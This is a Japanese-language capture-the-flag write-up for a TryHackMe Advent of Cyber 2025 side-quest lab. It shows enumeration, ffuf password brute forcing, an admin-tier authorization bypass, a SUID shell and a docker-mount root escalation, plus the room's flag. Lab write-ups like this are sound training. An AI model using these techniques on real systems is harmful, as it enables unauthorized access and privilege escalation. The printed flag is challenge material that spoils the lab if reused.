# The Great Disappearing Act CTF

https://tryhackme.com/room/sq1-aoc2025-FzPnrt2SAu

AOC2025のサイドクエスト。

前提として、https://tryhackme.com/room/linuxcli-aoc2025-o1fpqkvxti でアンロックキーの入手が必要。キーを入手すると、21337以外のポートが開く仕掛けになっている。

## Enumeration

```shell
TARGET=10.48.145.181
sudo bash -c "echo $TARGET   aoc.thm >> /etc/hosts"
```

### ポートスキャン

```sh
PORT      STATE SERVICE    REASON
22/tcp    open  ssh        syn-ack ttl 64
80/tcp    open  http       syn-ack ttl 64
8000/tcp  open  http-alt   syn-ack ttl 63
8080/tcp  open  http-proxy syn-ack ttl 64
9001/tcp  open  tor-orport syn-ack ttl 63
13400/tcp open  doip-data  syn-ack ttl 64
13401/tcp open  unknown    syn-ack ttl 64
13402/tcp open  unknown    syn-ack ttl 64
13403/tcp open  unknown    syn-ack ttl 64
13404/tcp open  unknown    syn-ack ttl 64
21337/tcp open  unknown    syn-ack ttl 64
```

```sh
sudo nmap -sV -p22,80,8000,8080,9001,13400,13401,13402,13403,13404,21337 $TARGET

PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http        nginx 1.24.0 (Ubuntu)
8000/tcp  open  http-alt
8080/tcp  open  http        SimpleHTTPServer 0.6 (Python 3.12.3)
9001/tcp  open  tor-orport?
13400/tcp open  http        nginx 1.24.0 (Ubuntu)
13401/tcp open  unknown
13402/tcp open  http        nginx 1.24.0 (Ubuntu)
13403/tcp open  unknown
13404/tcp open  unknown
21337/tcp open  unknown
```

SSH, HTTP(80, 8000, 8080, 13400, 13402)

実際に表示すると以下の構成。

1. 80, 8080 - `HOPSEC ASYLUM - ACCESS TERMINAL`
2. 8000 - `Fake book`
3. 13400 - `HopSec Asylum – Facility Video Portal`
4. 13402 - `Welcome to nginx!`

1 のログイン画面には、`Hopkins, please stop forgetting your password`と表示されている。  
1, 3 のログイン画面はメールアドレスが必要。  
2 のログイン画面はメールアドレスまたはユーザー名が必要。ユーザー登録のボタンもある。

### 1 80, 8080

適当に入力してログインボタンを押すと、http://aoc.thm/cgi-bin/login.sh で404エラーになる。

8080 ポートは404エラーにならなかった。

### 2 8000 Fakebook

適当に入力すると、`The e-mail address and/or password you specified are not correct.` の表示。CSRFトークンあり。

### 3 13400 HopSec Asylum

適当に入力すると、`Login failed` の表示。CSRFトークン無し。

### 4 nginx 13402port

間違いなく何か隠されているとは思うが、何も出てこない。

```sh
root@ip-10-49-73-186:~# cat /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt | sort -u > ./dirlist.txt
root@ip-10-49-73-186:~# gobuster dir -q -x=txt,bak,zip -u http://$TARGET:13402 -w ./dirlist.txt -t 64 -k
root@ip-10-49-73-186:~# gobuster dir -q -x=conf,tar -u http://$TARGET:13402 -w ./dirlist.txt -t 64 -k
root@ip-10-49-73-186:~# gobuster dir -q -x=php,py -u http://$TARGET:13402 -w ./dirlist.txt -t 64 -k
root@ip-10-49-73-186:~# gobuster dir -q -x=sh -u http://$TARGET:13402 -w ./dirlist.txt -t 64 -k
root@ip-10-49-73-186:~# gobuster dir -q -x=html,htm -u http://$TARGET:13402 -w ./dirlist.txt -t 64 -k
/index.html           (Status: 200) [Size: 615]
```

## Fakebook

ユーザー登録してポストを読む。

リスト組み合わせによるブルートフォースを示唆している。

```
Trying my hand at some bruteforcing challenges on thm, good to see they have /opt/hashcat-utils/src/combinator.bin on the AttackBox! Always comes in handy
```

警備員の過去のパスワード

```
Did you know that if you enter your password as a comment on a post, it appears as *'s?
 
 Guard Hopkins
Pizza1234$
 Guard Hopkins
WHAT THE HELL CARROTBANE!!! NOW I NEED TO CHANGE MY PASSWORD!!!!!
 Sir Carrotbane
HAHA just seeing who the weak links are!
```

警備員のメールアドレスを入手

```
guard.hopkins@hopsecasylum.com
```

### 13400 HopSec Asylum ブルートフォース

`Pizza1234$` の形をヒントに、単語、四桁数字、特殊文字1文字でリストを作ってブルートフォースして成功。

```sh
$ ffuf -u http://10.49.138.142:13401/v1/auth/login -c -w 2.txt -X POST -d '{"username":"guard.hopkins@hopsecasylum.com","password":"FUZZ"}' -fc 401 -H 'Content-Type: application/json'

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://10.49.138.142:13401/v1/auth/login
 :: Wordlist         : FUZZ: /home/kali/ctf/aoc1/2.txt
 :: Header           : Content-Type: application/json
 :: Data             : {"username":"guard.hopkins@hopsecasylum.com","password":"FUZZ"}
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response status: 401
________________________________________________

[REDACTED]          [Status: 200, Size: 264, Words: 7, Lines: 2, Duration: 158ms]
:: Progress: [150000/150000] :: Job [1/1] :: 109 req/sec :: Duration: [0:21:29] :: Errors: 0 ::
```

## カメラ admin認証バイパス

認証トークン。ロールをadminにする必要があると考える。

```json
Authorization: Bearer {"sub": "guard.hopkins@hopsecasylum.com", "role": "guard", "iat": 1764657725}.f8d5322b24e84732d1af9e2237567bf61d71cd5c8e968564703081daa0bb4c46
```

- iat や 後半のSHA256?ハッシュの1文字でも変えると認証エラーになるので、ハッシュは改ざん防止のためにつけられていると考えられる。
- Bearer と { の間にスペースを入れただけでも認証エラー
- ハッシュの後にスペースを入れても認証エラー

SHA256のソルトをrockyouで割れないか試したが、空振り。

```python
import hashlib
import hmac

payload = '{"sub": "guard.hopkins@hopsecasylum.com", "role": "guard", "iat": 1764657725}'
target_hash = "f8d5322b24e84732d1af9e2237567bf61d71cd5c8e968564703081daa0bb4c46"
rockyou_path = "/usr/share/wordlists/rockyou.txt"

n = 0
with open(rockyou_path, "r", encoding="latin-1") as f:
    for line in f:
        salt = line.strip()
        n += 1
        if n % 1000000 == 0:
            print(n)

        # salt + payload
        h1 = hashlib.sha256((salt + payload).encode()).hexdigest()
        if h1 == target_hash:
            print(f"[FOUND] salt+payload: {salt}")
            break

        # payload + salt
        h2 = hashlib.sha256((payload + salt).encode()).hexdigest()
        if h2 == target_hash:
            print(f"[FOUND] payload+salt: {salt}")
            break

        # hmac
        h3 = hmac.new(salt.encode(), payload.encode(), hashlib.sha256).hexdigest()
        if h3 == target_hash:
            print(f"[FOUND] hmac: {salt}")
            break
```

ここで行き詰まり、後日[ウォークスルー](https://0xb0b.gitbook.io/writeups/tryhackme/2025/advent-of-cyber-25-side-quest/the-great-disappearing-act)を見て再開。

request に tier パラメータを追加したらadminのチケットが得られる。・・・これは気づきにくい。

```http
POST /v1/streams/request?tier=admin HTTP/1.1
Host: aoc:13401
Content-Length: 40
Pragma: no-cache
Cache-Control: no-cache
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36
Content-Type: application/json
Authorization: Bearer {"sub": "guard.hopkins@hopsecasylum.com", "role": "guard", "iat": 1767661169}.057e48e5e5dfa8ee49bb8831155b38e81b7459a267665a1bf6ec015d4bf76d14
Accept: */*
Origin: http://aoc:13400
Referer: http://aoc:13400/
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9,ja;q=0.8
x-forwarded-for: localhost
Connection: keep-alive

{"camera_id":"cam-admin","tier":"admin"}
```

```http
HTTP/1.1 200 OK
Server: Werkzeug/3.1.3 Python/3.12.3
Date: Tue, 06 Jan 2026 01:10:37 GMT
Content-Type: application/json
Content-Length: 78
Access-Control-Allow-Origin: http://aoc:13400
Vary: Origin
Access-Control-Allow-Headers: Authorization,Content-Type,Range
Access-Control-Allow-Methods: GET,POST,OPTIONS
Access-Control-Expose-Headers: Content-Range,Accept-Ranges
Connection: close

{"effective_tier":"admin","ticket_id":"0c824d48-9af7-4148-8374-0eb59f91c98c"}
```

チケットIDを使ってビデオを再生し、テンキーの入力内容が分かった。これを8080ポートで入力すると、フラグ2の前半が表示された。

```js
attachWithReconnect(API + '/v1/streams/' + '0c824d48-9af7-4148-8374-0eb59f91c98c' + '/manifest.m3u8');
```

マニフェストファイルをダウンロード。/v1/ingest/diagnostics, /v1/ingest/jobs の2エンドポイントが含まれる。

```sh
wget http://aoc:13401/v1/streams/3e77254a-743a-46ed-8e1e-41fb5c679f82/manifest.m3u8

$ cat ./manifest.m3u8 
#EXTM3U
#EXT-X-VERSION:3
#EXT-X-TARGETDURATION:8
#EXT-X-MEDIA-SEQUENCE:0
#EXT-X-START:TIME-OFFSET=0,PRECISE=YES
#EXT-X-SESSION-DATA:DATA-ID="hopsec.diagnostics",VALUE="/v1/ingest/diagnostics"
#EXT-X-DATERANGE:ID="hopsec-diag",CLASS="hopsec-diag",START-DATE="1970-01-01T00:00:00Z",X-RTSP-EXAMPLE="rtsp://vendor-cam.test/cam-admin"
#EXT-X-SESSION-DATA:DATA-ID="hopsec.jobs",VALUE="/v1/ingest/jobs"
```

diagnostics

```http
POST /v1/ingest/diagnostics HTTP/1.1
Host: aoc:13401
Content-Length: 57
Pragma: no-cache
Cache-Control: no-cache
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36
Content-Type: application/json
Authorization: Bearer {"sub": "guard.hopkins@hopsecasylum.com", "role": "guard", "iat": 1767661169}.057e48e5e5dfa8ee49bb8831155b38e81b7459a267665a1bf6ec015d4bf76d14
Accept: */*
Origin: http://aoc:13400
Referer: http://aoc:13400/
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9,ja;q=0.8
x-forwarded-for: localhost
Connection: keep-alive

{
"rtsp_url" :  "rtsp://vendor-cam.test/cam-admin"
 }
```

```json
{"job_id":"63f8a3cc-5dab-4e57-9f18-8c18ebe36e43","job_status":"/v1/ingest/jobs/63f8a3cc-5dab-4e57-9f18-8c18ebe36e43"}
```

job

```http
GET /v1/ingest/jobs/63f8a3cc-5dab-4e57-9f18-8c18ebe36e43 HTTP/1.1
```

```json
{"console_port":13404,"rtsp_url":"rtsp://vendor-cam.test/cam-admin","status":"ready","token":"f8e0a4648ace4633872baffd8d1d5631"}
```

13404ポートでトークンを入れるとシェルを実行できた。

```sh
$ nc aoc 13404
f8e0a4648ace4633872baffd8d1d5631
svc_vidops@tryhackme-2404:~$ id
id
uid=1500(svc_vidops) gid=1500(svc_vidops) groups=1500(svc_vidops)
svc_vidops@tryhackme-2404:~$ 
```

9001ポートのサービス

```sh
svc_vidops@tryhackme-2404:~$ systemctl cat asylum-scada.service
systemctl cat asylum-scada.service
# /etc/systemd/system/asylum-scada.service
[Unit]
Description=Asylum Gate Control SCADA Terminal
Requires=docker.service
After=docker.service

[Service]
Type=oneshot
RemainAfterExit=yes
WorkingDirectory=/home/ubuntu/side-quest-2
ExecStart=/usr/bin/docker compose up -d
ExecStop=/usr/bin/docker compose down
TimeoutStartSec=0
Restart=on-failure
RestartSec=10

[Install]
WantedBy=multi-user.target
```

9001ポートでフラグ２を入力したら認証が通った。

```sh
╔══════════════════════════════════════════════════════════╗
║                    AVAILABLE COMMANDS                    ║
╚══════════════════════════════════════════════════════════╝

  status          - Display gate status and system info
  unlock <code>   - Unlock the gate with numeric authorization code
  lock            - Lock the gate
  info            - Display system information
  clear           - Clear terminal screen
  exit            - Disconnect from SCADA terminal
  
╔══════════════════════════════════════════════════════════╗
║  NOTE: Gate unlock requires numeric authorization code   ║
║        Retrieve the code from container root directory   ║
╚══════════════════════════════════════════════════════════╝

[SCADA-ASYLUM-GATE] #LOCKED> status
Gate Status: LOCKED
Host System: 1cbf40c715f4
Code Location: /root/.asylum/unlock_code
```

SUID付きファイル

```sh
svc_vidops@tryhackme-2404:~$ ls -al /usr/local/bin/diag_shell
ls -al /usr/local/bin/diag_shell
-rwsr-xr-x 1 dockermgr dockermgr 16056 Nov 27 16:31 /usr/local/bin/diag_shell
```

dockermgr としてシェルを実行できている。

```sh
svc_vidops@tryhackme-2404:/home$ /usr/local/bin/diag_shell
/usr/local/bin/diag_shell
dockermgr@tryhackme-2404:/home$ id
id
uid=1501(dockermgr) gid=1500(svc_vidops) groups=1500(svc_vidops)
```

.ssh/authorized_keys を作成してSSH接続。

alpine を使ってエスケープできた。

```sh
dockermgr@tryhackme-2404:~$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
# id
uid=0(root) gid=0(root) groups=0(root),1(daemon),2(bin),3(sys),4(adm),6(disk),10(uucp),11,20(dialout),26(tape),27(sudo)
```

ubuntuのホームディレクトリの下の、scada_terminal.py を見たら最後のコードが書かれていた。それを画面で入力してフラグ3を入手。

## 振り返り

- tierパラメータに気付くのは難しい。
- マニフェストファイルからAPIエンドポイントにつなげるのも難しい。
- 最後に得られるinvitationコードを入力してもInvalidエラーとなるだけだった。

```txt
http://aoc.thm:21337
now_you_see_me

https://static-labs.tryhackme.cloud/apps/hoppers-invitation/
THM{There.is.no.EASTmas.without.Hopper}
```

## Tags

#tags:puzzle
